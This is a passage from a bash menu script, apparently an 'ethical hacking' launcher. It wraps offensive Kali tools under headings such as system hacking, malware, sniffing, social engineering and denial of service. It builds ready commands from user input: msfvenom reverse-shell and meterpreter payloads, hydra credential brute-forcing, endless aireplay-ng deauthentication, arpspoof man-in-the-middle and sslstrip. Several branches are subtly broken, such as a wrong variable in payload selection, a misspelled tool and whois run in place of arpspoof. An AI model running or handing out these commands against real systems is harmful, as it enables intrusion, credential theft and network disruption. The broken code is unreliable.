		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       dnsrecon -d $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       dnsrecon $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) man nikto;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       nikto -host $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       nikto $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) man enum4linux;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       enum4linux $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       enum4linux $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man smtp-user-enum;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       smtp-user-enum $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       smtp-user-enum $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
  		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) man sslstrip;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Port Number:=";sleep 0.10
		       read y
		       sslstrip -l $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       sslstrip $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man armitage;;
		 2) armitage ;;
		 0) main_menu
	            continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac;;
	   0) main_menu
	      continue ;;
	   esac ;;
	4) echo "===================================================================================================================================="
 	   echo -e "\e[32m					*** SYSTEM HACKING ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mHacking generally refers to unauthorized intrusion into a computer or a network. The person engaged in hacking activities is known as a hacker. This hacker may alter system or security features to accomplish a goal that differs from the original purpose of the system.
Hacking can also refer to non-malicious activities, usually involving unusual or improvised alterations to equipment or processes.
Password cracking: the process of recovering passwords from data stored or transmitted by computer systems.

Links:-
https://ilabs.eccouncil.org › Ethical Hacking Exercises › System Hacking
https://www.greycampus.com/opencampus/ethical-hacking/goals-of-system-hacking
https://www.linkedin.com/learning/ethical-hacking-system-hacking
https://thenextweb.com › Offers
";sleep 0.10;;
	   2) echo "===================================================================================================================================="
   	      echo -e "\e[33m1.MSFCONSOLE";sleep 0.10
	      echo "2.ARMITAGE";sleep 0.10
	      echo "3.HYDRA";sleep 0.10
	      echo "4.CRUNCH";sleep 0.10
	      echo "5.PWDUMP";sleep 0.10
	      echo "6.JOHN THE RIPPER";sleep 0.10
	      echo "7.HASHCAT";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man msfconsole;;
		 2) msfconsole ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man armitage;;
		 2) armitage ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hydra;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter User File Name/Path:=";sleep 0.10
		       read a
		       echo "Enter Pass File Name/Path:=";sleep 0.10
		       read b
		       echo "Enter Service name/IP ADDRESS/DNS:=";sleep 0.10
		       read c
		       hydra -L $a -P $b $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hydra $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man crunch;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Minimun Length String to Crunch:=";sleep 0.10
		       read a
		       echo "Enter Maximun Length String to Crunch:=";sleep 0.10
		       read b
		       echo "Enter Type of char/number:=";sleep 0.10
		       read c
		       crunch $a $b $c  ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       crunch $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) man pwdump;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter hash:=";sleep 0.10
		       read y
		       pwdump $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       pwdump $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man john;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Password File:=";sleep 0.10
		       read y
		       john $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       john $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hashcat;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Code of Hashing algorithm:=";sleep 0.10
		       read a
		       echo "Enter Hash/File name:=";sleep 0.10
		       read b
		       hashcat -m $a $b ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hashcat $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	    esac;;
	   0) main_menu
	      continue ;;
	   esac ;;
	5) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** MALWARE THREATS ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mMalware is short for malicious software - computer programs designed to infiltrate and damage computers without the users consent. 
		    Malware is the general term covering all the different types of threats to your computer safety such as viruses, spyware, 
                      worms,trojans, rootkits and so on.
		    1.Root kit: represents a set of programs which work to subvert control of an operating system from legitimate operators
		    2.Trojan horse: serves as a back door in a computer system to allow an intruder to gain access to the system later
		    3.Viruses: self-replicating programs that spread by inserting copies of themselves into other executable code files or documents
		    4.Key loggers: tools designed to record every keystroke on the affected machine for later retrieval.
Links:-
https://www.webroot.com/gb/en/resources/tips-articles/malware
https://www.lifewire.com › How To › Antivirus › Key Concepts
https://cyberscout.com/education/blog/3-major-malware-threats-on-the-rise
fr1-kaspcom-proxy.kaspersky-labs.com/internet-security.../threats/types-of-malware
https://www.sentinelone.com/blog/new-malware-threats-ransomworm/";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.MSFCONSOLE";sleep 0.10
	      echo "2.ARMITAGE";sleep 0.10
	      echo "3.MSFVENOM";sleep 0.10
	      echo "4.MALTEGO";sleep 0.10
	      echo "5.SETOOLKIT";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man msfconsole;;
		 2) msfconsole ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man armitage;;
		 2) armitage ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10		
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man msfvenom;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    clear
		    case $q in
 		    1) echo -e "\e[32m                              ***************MSFVENOM*******************";echo " "
		       echo -e "\e[33mEnter LHOST:=";sleep 0.10
		       read b
		       echo "Enter LPORT:=";sleep 0.10
		       read c
		       echo "OUTPUT FILE NAME:=";sleep 0.10
		       read d
		       echo "SELECT PAYLOAD TO USE:=";sleep 0.10
		       echo "1. android/meterpreter/reverse_tcp";sleep 0.10
		       echo "2. cmd/unix/bind_netcat";sleep 0.10
		       echo "3. cmd/unix/reverse_python";sleep 0.10
		       echo "4. cmd/windows/powershell_reverse_tcp";sleep 0.10
		       echo "5. linux/x64/shell/reverse_tcp";sleep 0.10
		       echo "6. linux/x86/meterpreter/reverse_tcp";sleep 0.10
		       read m
		       case $q in
		       1) msfvenom -p android/meterpreter/reverse_tcp  LHOST=$b LPORT=$c R > $d;;
		       2) msfvenom -p cmd/unix/bind_netcat  LHOST=$b LPORT=$c R > $d;;
		       3) msfvenom -p cmd/unix/reverse_python  LHOST=$b LPORT=$c R > $d;;
		       4) msfvenom -p cmd/windows/powershell_reverse_tcp  LHOST=$b LPORT=$c R > $d;;
		       5) msfvenom -p linux/x64/shell/reverse_tcp  LHOST=$b LPORT=$c R > $d;;
		       6) msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$b LPORT=$c R > $d;;
		       esac ;;
		     2) echo "Enter Your Fields";sleep 0.10
		       read l
		       msfvenom $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man maltego;;
		 2) maltego;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="		
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man setoolkit;;
		 2) setoolkit ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	    esac;;
	   0) main_menu 
	      continue;;
	   esac ;;
	6) echo "===================================================================================================================================="
	   echo "					*** SNIFFING *** ";echo "  ";sleep 0.10
	   echo "1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mSniffing is the process of monitoring and capturing all the packets passing through a given network using sniffing tools. It is a form of “tapping phone wires” and get to know 1.ABOUT the conversation. It is also called wiretapping applied to the computer networks.
                    In other words, Sniffing allows you to see all sorts of traffic, both protected and unprotected. In the right conditions and with the right protocols in place, an attacking party may be able to gather information that can be used for further attacks or to cause other issues for the network or system owner.
What can be sniffed?
One can sniff the following sensitive information from a network −
1.Email traffic
2.FTP passwords
3.Web traffics
4.Telnet passwords
5.Router configuration
6.Chat session
7.DNS traffic

Links:-
https://www.greycampus.com/opencampus/ethical-hacking/sniffing-and-its-types
www.valencynetworks.com/blogs/cyber-attacks-explained-network-sniffing/
https://www.geeksforgeeks.org/what-is-packet-sniffing/
https://securebox.comodo.com/ssl-sniffing/network-sniffing/
https://www.lynda.com/Windows-Server-tutorials/Exploring...sniffing/.../445211-4.html";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.WIRESHARK";sleep 0.10
	      echo "2.TSHARK";sleep 0.10
	      echo "3.ARPSPOOF";sleep 0.10
	      echo "4.DRIFTNET";sleep 0.10
	      echo "5.ETTERCAP";sleep 0.10
	      echo "6.HAMSTER";sleep 0.10
	      echo "7.MACCHANGER";sleep 0.10
	      echo "8.MITMPROXY";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man wireshark;;
		 2) wireshark ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man tshark;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Interface Name:=";sleep 0.10
		       read y
		       sudo tshark $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       tshark $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man arpspoof;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter HOST IP ADDRESS:=";sleep 0.10
		       read a
		       echo "Enter TARGET IP ADDRESS:=";sleep 0.10
		       read b
		       echo "Enter Interface Name:=";sleep 0.10
		       read c
		       arpspoof -t $b -r $a -i $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man driftnet;;
		 2) driftnet;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man ettercap;;
		 2) ettercap;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man hamster;;
		 2) hamster ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man macchanger;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Interface Name:=";sleep 0.10
		       read y
		       sudo ifconfig $y down
		       sudo macchanger -r $y
		       sudo ifconfig $Y up ;;
		    2) echo "Enter Interface Name:=";sleep 0.10
		       read m
                       echo "Enter Fields:=";sleep 0.10
		       read y
		       sudo ifconfig $m down		      
		       sudo macchanger $y $l
		       sudo ifconfig $m up ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      8) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man mitmproxy;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       mitmroxy $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       mitmproxy $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	    esac;;
	   0) main_menu
	      continue ;;
	   esac ;;
	7) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** SOCIAL ENNGINEERING ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mExample 1
                    You must have noticed old company documents being thrown into dustbins as garbage. These documents might contain sensitive information such as Names, Phone Numbers, Account Numbers, Social Security Numbers, Addresses, etc. Many companies still 2.USE carbon paper in their fax machines and once the roll is over, its carbon goes into dustbin which may have traces of sensitive data. Although it sounds improbable, but attackers can easily retrieve information from the company dumpsters by pilfering through the garbage.
		    Example 2
		    An attacker may befriend a company personnel and establish good relationship with him over a period of time. This relationship can be established online through social networks, chatting rooms, or offline at a coffee table, in a playground, or through any other means. The attacker takes the office personnel in confidence and finally digs out the required sensitive information without giving a clue.
  		    Example 3
		    A social engineer may pretend to be an employee or a valid user or an VIP by faking an identification card or simply by convincing employees of his position in the company. Such an attacker can gain physical access to restricted areas, thus providing further opportunities for attacks.
		  
Links:
https://www.incapsula.com/web-application-security/social-engineering-attack.html
https://searchsecurity.techtarget.com/definition/social-engineering
https://www.webroot.com/ie/en/resources/tips-articles/what-is-social-engineering
https://www.gravoc.com/2017/04/04/what-is-social-engineering/
https://www.mitnicksecurity.com/site/news_item/how-to-recognize-social-engineering";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.SETOOLKIT";sleep 0.10
	      echo "2.VEIL";sleep 0.10
	      echo "3.GHOST PHISING";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man setoolkit;;
		 2) setoolkit;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man veil;;
		 2) veil ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man ghostphisher;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       whois $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	  0) main_menu
	      continue ;;
	   esac ;;
	8) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** DENIAL OF SERVICE ***";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mA Distributed Denial of Service (DDoS) attack is an attempt to make an online service or a website unavailable by overloading it with huge floods of traffic generated from multiple sources.Unlike a Denial of Service (DoS) attack, in which one computer and one Internet connection is used to flood a targeted resource with packets, a DDoS attack uses many computers and many Internet connections, often distributed globally in what is referred to as a botnet.
                    A large scale volumetric DDoS attack can generate a traffic measured in tens of Gigabits (and even hundreds of Gigabits) per second. We are sure your normal network will not be able to handle such traffic.

Links:-
https://searchsecurity.techtarget.com/definition/denial-of-service
https://www.paloaltonetworks.com/cyberpedia/what-is-a-denial-of-service-attack-dos
https://www.globalsign.com/en/blog/what-is-denial-of-service-attack/
https://en.wikipedia.org/wiki/Denial-of-service_attack
https://www.linkedin.com/learning/...denial-of-service/understanding-denial-of-service";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.AIREPLAY-NG";sleep 0.10
	      echo "2.MDK3";sleep 0.10
	      echo "3.HPING3";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man aireplay-ng;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter host Mac address:=";sleep 0.10
		       read a
		       echo "Enter station Mac address:=";sleep 0.10
		       read b
		       echo "Enter interface name:=";sleep 0.10
		       read c
		       aireplay-ng --deauth 0 -b $a -c $b $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       aireplay-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man mdk3;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       mdk3 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       mdk3 $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hping3;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name/IP ADDRESS:=";sleep 0.10
		       read y
		       hping3 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hping3 $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;; 
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
	9) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** SESSION HIJACKING *** ";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mTCP/IP Hijacking is when an authorized user gains access to a genuine network connection of another user. It is done in order to bypass the password authentication which is normally the start of a session.
In theory, a TCP/IP connection is established as shown below −
To hijack this connection, there are two possibilities -
Find the seq which is a number that increases by 1, but there is no chance to predict it.
The second possibility is to 2.USE the Man-in-the-Middle attack which, in simple words, is a type of network sniffing. For sniffing, we 2.USE tools like Wireshark or Ethercap.
Example -
An attacker monitors the data transmission over a network and discovers the IP’s of two devices that participate in a connection.
When the hacker discovers the IP of one of the users, he can put down the connection of the other user by DoS attack and then resume communication by spoofing the IP of the disconnected user.

Links:-
https://www.geeksforgeeks.org/session-hijacking/
https://www.interserver.net/tips/kb/session-hijacking-prevent/
https://www.greycampus.com/opencampus/ethical.../session-hijacking-and-its-types
https://www.lynda.com/IT-Infrastructure-tutorials/Session-hijacking/.../751270-4.html
https://allabouttesting.org/session-hijacking-explained/";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.HAMSTER";sleep 0.10
	      echo "2.FERRET";sleep 0.10
	      echo "3.SSLSTRIP";sleep 0.10
	      echo "4.JAGGERNAUT";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man hamster;;
		 2) hamster ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
